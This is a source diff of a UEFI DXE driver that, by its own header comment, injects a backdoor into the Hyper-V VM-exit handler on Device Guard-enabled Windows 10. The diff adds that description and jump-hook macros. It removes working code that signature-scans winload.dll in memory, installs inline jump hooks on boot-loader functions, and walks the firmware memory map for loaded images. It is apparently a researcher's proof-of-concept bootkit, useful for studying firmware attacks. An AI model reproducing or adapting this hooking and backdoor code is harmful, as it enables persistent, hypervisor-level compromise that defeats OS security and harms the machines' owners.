@@ -1,3 +1,31 @@
+/*
+ *********************************************************************
+  
+  UEFI DXE driver that injects Hyper-V VM exit handler backdoor into 
+  the Device Guard enabled Windows 10 Enterprise.
+  
+  Execution starts from new_ExitBootServices() -- a hook handler 
+  for EFI_BOOT_SERVICES.ExitBootServices() which being called by
+  winload!OslFwpKernelSetupPhase1(). After DXE phase exit winload.efi
+  transfers exeution to previously loaded Hyper-V kernel (hvix64.sys)
+  by calling winload!HvlpTransferToHypervisor().
+  
+  To transfer execution to Hyper-V winload.efi uses a special stub
+  winload!HvlpLowMemoryStub() copied to reserved memory page at constant
+  address 0x2000. During runtime phase this memory page is visible to
+  hypervisor core at the same virtual and physical address and has 
+  executable permissions which makes it a perfect place to store our 
+  Hyper-V backdoor code.
+  
+  VMExitHandler() is a hook handler for VM exit function of hypervisor 
+  core, it might be used for interaction between hypervisor backdoor and
+  guest virtual machines.
+  
+  @d_olex
+
+ *********************************************************************
+ */
+
 #include <Protocol/LoadedImage.h>
 #include <Protocol/DevicePath.h>
 #include <Protocol/SerialIo.h>
@@ -30,6 +58,15 @@
 #pragma warning(disable: 4305)
 
 #pragma section(".conf", read, write)
+
+#define JUMP32_LEN 5
+
+// destination from operand
+#define JUMP32_ADDR(_addr_) ((UINTN)(_addr_) + *(INT32 *)((UINT8 *)(_addr_) + 1) + JUMP32_LEN)
+
+// destination to operand
+#define JUMP32_OP(_from_, _to_) ((UINT32)((UINTN)(_to_) - (UINTN)(_from_) - JUMP32_LEN))
+
 
 EFI_STATUS 
 EFIAPI
@@ -156,267 +193,6 @@ VOID *BackdoorImageRealocate(VOID *Image)
     }
  
     return NULL;
-}
-//--------------------------------------------------------------------------------------
-typedef VOID * (EFIAPI * func_BlMmAllocateHeap)(UINTN Size);
-
-func_BlMmAllocateHeap f_BlMmAllocateHeap = NULL;
-
-#define JUMP32_LEN 5
-
-// destination from operand
-#define JUMP32_ADDR(_addr_) ((UINTN)(_addr_) + *(INT32 *)((UINT8 *)(_addr_) + 1) + JUMP32_LEN)
-
-// destination to operand
-#define JUMP32_OP(_from_, _to_) ((UINT32)((UINTN)(_to_) - (UINTN)(_from_) - JUMP32_LEN))
-
-#define WINLOAD_HOOK_SIZE JUMP32_LEN
-#define WINLOAD_HOOK_BUFF WINLOAD_HOOK_SIZE * 2
-
-typedef VOID (EFIAPI * func_Archpx64TransferTo64BitApplicationAsm)(VOID);
-
-UINT8 buff_Archpx64TransferTo64BitApplicationAsm[WINLOAD_HOOK_BUFF];
-func_Archpx64TransferTo64BitApplicationAsm old_Archpx64TransferTo64BitApplicationAsm = NULL;
-
-VOID new_Archpx64TransferTo64BitApplicationAsm(VOID)
-{
-    // ...
-
-    // call original funtion
-    old_Archpx64TransferTo64BitApplicationAsm();
-}
-
-BOOLEAN HandleWinload(VOID *LoaderBase)
-{
-    UINTN i = 0;    
-
-    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(LoaderBase, 
-        ((EFI_IMAGE_DOS_HEADER *)LoaderBase)->e_lfanew);        
-
-    for (i = 0; i < pHeaders->OptionalHeader.SizeOfImage; i += 1) 
-    {
-        UINT8 *Buff = RVATOVA(LoaderBase, i);
-
-        /*
-            Match winload!FatInitialize() code signature:
-
-                mov     ecx, 200h
-                call    BlMmAllocateHeap
-                mov     cs:FatpLongFileName, rax
-                neg     rax
-        */
-        if (*(Buff + 0x00) == 0xb9 && *(UINT32 *)(Buff + 0x01) == 0x200 && /*  mov ecx, 200h */
-            *(Buff + 0x05) == 0xe8 && /* call BlMmAllocateHeap */
-            *(Buff + 0x0a) == 0x48 && *(Buff + 0x0b) == 0x89 && /* mov cs:FatpLongFileName, rax */
-            *(Buff + 0x11) == 0x48 && *(Buff + 0x12) == 0xf7 && *(Buff + 0x13) == 0xd8) /* neg rax */
-        {
-            if (f_BlMmAllocateHeap != NULL)
-            {
-                continue;
-            }
-
-            // get calee address
-            f_BlMmAllocateHeap = (func_BlMmAllocateHeap)JUMP32_ADDR(Buff + 0x05);
-            
-            DbgMsg(__FILE__, __LINE__, "winload!BlMmAllocateHeap() is at "FPTR"\r\n", f_BlMmAllocateHeap);
-        }
-
-        /*
-            Match winload!Archpx64TransferTo64BitApplicationAsm() code signature:
-
-                .text:000000014010A610      push    rbp
-                .text:000000014010A612      push    rsi
-                .text:000000014010A613      push    rdi
-                .text:000000014010A614      push    rbx
-                .text:000000014010A615      pushfq
-                .text:000000014010A616      cmp     cs:ArchpParentAppInterruptState, 0
-                .text:000000014010A61D      jz      short loc_14010A620
-                .text:000000014010A61F      cli
-                .text:000000014010A620      mov     rax, cr0
-                .text:000000014010A623      push    rax
-                .text:000000014010A624      mov     rax, cr4
-                .text:000000014010A627      push    rax
-                .text:000000014010A628      mov     rax, cr3
-                .text:000000014010A62B      push    rax
-                .text:000000014010A62C      mov     cs:ArchpParentAppStack, rsp
-                .text:000000014010A633      mov     rdx, cs:ArchpChildAppDescriptorTableContext
-
-                ...
-
-                .text:000000014010A685      mov     rax, cs:ArchpChildAppEntryRoutine
-                .text:000000014010A68C      call    rax
-
-                ...
-        */
-        if (*(Buff + 0x00) == 0x48 && *(Buff + 0x01) == 0x55 && /* push rbp */
-            *(Buff + 0x10) == 0x0f && *(Buff + 0x11) == 0x20 && *(Buff + 0x12) == 0xc0 && /* mov rax, cr0 */
-            *(Buff + 0x14) == 0x0f && *(Buff + 0x15) == 0x20 && *(Buff + 0x16) == 0xe0 && /* mov rax, cr4 */
-            *(Buff + 0x18) == 0x0f && *(Buff + 0x19) == 0x20 && *(Buff + 0x1a) == 0xd8 && /* mov rax, cr3 */
-            *(Buff + 0x1c) == 0x48 && *(Buff + 0x1d) == 0x89 && *(Buff + 0x1e) == 0x25 && /* mov cs:ArchpParentAppStack, rsp */   
-            *(Buff + 0x75) == 0x48 && *(Buff + 0x76) == 0x8b && *(Buff + 0x77) == 0x05)  /* mov rax, cs:ArchpChildAppEntryRoutine */
-        {
-            UINT8 *Func = Buff;
-            UINT8 *Callgate = buff_Archpx64TransferTo64BitApplicationAsm;
-
-            if (old_Archpx64TransferTo64BitApplicationAsm != NULL)
-            {
-                continue;
-            }
-
-            DbgMsg(__FILE__, __LINE__, "winload!Archpx64TransferTo64BitApplicationAsm() is at "FPTR"\r\n", Func);
-
-            /*
-                Set up hook on winload!Archpx64TransferTo64BitApplicationAsm()
-            */
-            
-            // save original bytes
-            m_BS->CopyMem(Callgate, Func, WINLOAD_HOOK_SIZE);
-
-            // jmp addr ; from function to handler
-            *Func = 0xe9;
-            *(UINT32 *)(Func + 1) = JUMP32_OP(Func, new_Archpx64TransferTo64BitApplicationAsm);
-            
-            // jmp addr ; from callgate function to function
-            *(UINT8 *)(Callgate + WINLOAD_HOOK_SIZE) = 0xe9;
-            *(UINT32 *)(Callgate + WINLOAD_HOOK_SIZE + 1) = \
-                JUMP32_OP(Callgate + WINLOAD_HOOK_SIZE, Func + WINLOAD_HOOK_SIZE);
-
-            old_Archpx64TransferTo64BitApplicationAsm =
-                (func_Archpx64TransferTo64BitApplicationAsm)Callgate;
-
-            return TRUE;
-        }
-    }
-
-    return FALSE;
-}
-//--------------------------------------------------------------------------------------
-BOOLEAN HandleLoadedImage(VOID *Image)
-{
-    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Image,
-        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);
-
-    UINT32 ExportRva = pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-
-    if (ExportRva != 0)
-    {
-        // get export name for this image
-        EFI_IMAGE_EXPORT_DIRECTORY *pExport = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportRva);
-
-        if (ExportRva < pHeaders->OptionalHeader.SizeOfImage &&
-            pExport->AddressOfFunctions < pHeaders->OptionalHeader.SizeOfImage &&
-            pExport->AddressOfNames < pHeaders->OptionalHeader.SizeOfImage &&
-            pExport->AddressOfNameOrdinals < pHeaders->OptionalHeader.SizeOfImage &&
-            pExport->Name < pHeaders->OptionalHeader.SizeOfImage && pExport->Name != 0)
-        {
-            char *ExportName = (char *)RVATOVA(Image, pExport->Name);            
-
-            DbgMsg(
-                __FILE__, __LINE__, "IMAGE: addr = "FPTR", size = 0x%x, name = '%s'\r\n", 
-                Image, pHeaders->OptionalHeader.SizeOfImage, ExportName
-            );
-
-            if (!strcmp(ExportName, "winload.dll"))
-            {
-                return HandleWinload(Image);
-            }
-        }
-    }    
-
-    return FALSE;
-}
-//--------------------------------------------------------------------------------------
-BOOLEAN HandleExitBootServices(UINTN *pKey)
-{
-    EFI_STATUS Status = EFI_SUCCESS;  
-    EFI_MEMORY_DESCRIPTOR *MapList = NULL;
-    UINTN MapSize = 0, MapKey = 0, DescriptorSize = 0;
-    UINT32 DescriptorVersion = 0;
-
-    // get memory map size
-    Status = m_BS->GetMemoryMap(&MapSize, NULL, &MapKey, &DescriptorSize, &DescriptorVersion);
-    if (Status != EFI_BUFFER_TOO_SMALL)
-    {
-        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
-        return FALSE;
-    }
-
-#ifdef DBG_MEM
-
-    DbgMsg(__FILE__, __LINE__, "EFI_MEMORY_DESCRIPTOR version is 0x%x\r\n", DescriptorVersion);
-
-#endif
-
-    // allocate memory map buffer
-    Status = m_BS->AllocatePool(EfiBootServicesData, MapSize, (VOID **)&MapList);
-    if (Status != EFI_SUCCESS)
-    {
-        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
-        return FALSE;
-    }
-
-    // get memory map
-    Status = m_BS->GetMemoryMap(&MapSize, MapList, &MapKey, &DescriptorSize, &DescriptorVersion);
-    if (Status == EFI_SUCCESS)
-    {
-        UINTN i = 0;
-        EFI_MEMORY_DESCRIPTOR *MapEntry = MapList;        
-
-#ifdef DBG_MEM
-
-        DbgMsg(__FILE__, __LINE__, "MEMORY MAP:\r\n");
-#endif
-        for (i = 0; i < MapSize / DescriptorSize; i += 1)
-        {
-            UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE, n = 0;
-
-#ifdef DBG_MEM
-
-            DbgMsg(
-                __FILE__, __LINE__, " type = %d, addr = "FPTR", size = 0x%.8x\r\n",
-                MapEntry->Type, MapEntry->PhysicalStart, Len
-            );
-#endif
-            if (MapEntry->Type == EfiLoaderCode || 
-                MapEntry->Type == EfiLoaderData)
-            {
-                // scan memory for PE images
-                for (n = 0; n < Len - 0x200; n += DEFAULT_EDK_ALIGN)
-                {
-                    VOID *Image = RVATOVA(MapEntry->PhysicalStart, n);
-                    EFI_IMAGE_DOS_HEADER *pDosHdr = (EFI_IMAGE_DOS_HEADER *)Image;
-
-                    // check for PE image header
-                    if (pDosHdr->e_magic == EFI_IMAGE_DOS_SIGNATURE &&
-                        pDosHdr->e_lfanew + sizeof(EFI_IMAGE_NT_HEADERS) <= Len - n)
-                    {
-                        EFI_IMAGE_NT_HEADERS *pNtHdr = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Image, pDosHdr->e_lfanew);
-
-                        if (pNtHdr->Signature == EFI_IMAGE_NT_SIGNATURE)
-                        {                    
-                            if (HandleLoadedImage(Image))
-                            {
-                                goto _end;
-                            }
-                        }
-                    }
-                }
-            }        
-
-            // go to the next entry
-            MapEntry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MapEntry + DescriptorSize);
-        }
-_end:
-        *pKey = MapKey;
-
-        return TRUE;
-    }
-    else
-    {
-        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
-    } 
-
-    return FALSE;
 }
 //--------------------------------------------------------------------------------------
 // magic value of winload!HvlpBelow1MbPage to patch by PatchBelow1MbPageAddr()
@@ -733,6 +509,9 @@ VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLo
 
 VOID *new_HvlpTransferToHypervisor_end(VOID) { return (VOID *)&new_HvlpTransferToHypervisor; } 
 //--------------------------------------------------------------------------------------
+#define WINLOAD_HOOK_SIZE JUMP32_LEN
+#define WINLOAD_HOOK_BUFF WINLOAD_HOOK_SIZE * 2
+
 // original address of hooked function
 EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;
 
